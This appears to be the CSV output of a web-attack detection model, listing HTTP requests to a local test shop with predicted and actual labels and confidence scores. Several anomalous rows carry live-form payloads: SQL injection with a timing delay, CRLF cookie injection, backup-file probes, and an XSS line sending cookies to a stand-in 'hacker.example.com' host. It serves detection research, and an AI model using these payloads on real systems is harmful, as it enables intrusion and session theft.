Predicted,Actual,Confidence,Method,Content,URL
0,Normal,98.27%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
0,Normal,99.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
1,Anomalous,87.00%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tejani&password=arable&nombre=Josiana&apellidos=De+Anta+Colondres&email=agunda-wulff%40onoratoinformatica.aq&dni=427%278643%27&direccion=C%2F+Jose+Zamoray%2C+S%2FN+4C&ciudad=Narros+del+Puerto&cp=23770&provincia=Tarragona&ntc=2400850921681991&B1=Registrar HTTP/1.1
0,Normal,77.00%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gargulak&password=Bu7c2Pi%E9&nombre=Deysi&apellidos=Benapr%E9s+Vaqu%E9&email=ontiveros%40masqueclases.th&dni=50422961S&direccion=C%2Fjon+Pe%F1uelas%2C+117%2C+&ciudad=Quintanas+de+Gormaz&cp=38435&provincia=Valencia&ntc=9947210285103354&B1=Registrar HTTP/1.1
1,Anomalous,73.00%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bienek&pwd=cloqu%27e%2Fro&remember=off&B1=Entrar HTTP/1.1
1,Anomalous,100.00%,POST,id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1.bak HTTP/1.1
1,Anomalous,99.00%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=majd&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Osmar&apellidos=Blandon+Dato&email=scales_vlaenderen%40conoceagelespa%F1a.gg&dni=15613671Y&direccion=Calle+Isla+De+Corcega+87%2C+1-B&ciudad=Viladecans&cp=48144&provincia=Barcelona&ntc=4635391000655529&B1=Registrar HTTP/1.1
0,Normal,99.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0,Normal,99.12%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Anomalous,80.00%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85%7C&cantidad=67&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,82.00%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=peiser&password=9iri7aza&nombre=Nevel&apellidos=Domenge+Canelas&email=kirland-lincovsky%40la-sexta-f1.fo&dni=48549953N&direccion=Rio+Jarama+194+6-H&ciudad=Valverdejo&cp=20150&provincia=Toledo&ntc=9766800722499068&B1=Registrar HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8659&B1=Pasar+por+caja HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6840&B1=Pasar+por+caja%2F HTTP/1.1
1,Anomalous,100.00%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/global.OLD HTTP/1.1
1,Anomalous,100.00%,POST,errorMsg=Credenciales+incorrectas%4040,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/busytime.nsf HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=4828&B1=Confirmar HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidos=Esterric+Bou&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar HTTP/1.1
0,Normal,99.52%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1136&B1=Pasar+por+caja HTTP/1.1
0,Normal,98.70%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Anomalous,90.98%,POST,modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,99.43%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1,Anomalous,100.00%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&B1=Pasar+por+caja%2F HTTP/1.1
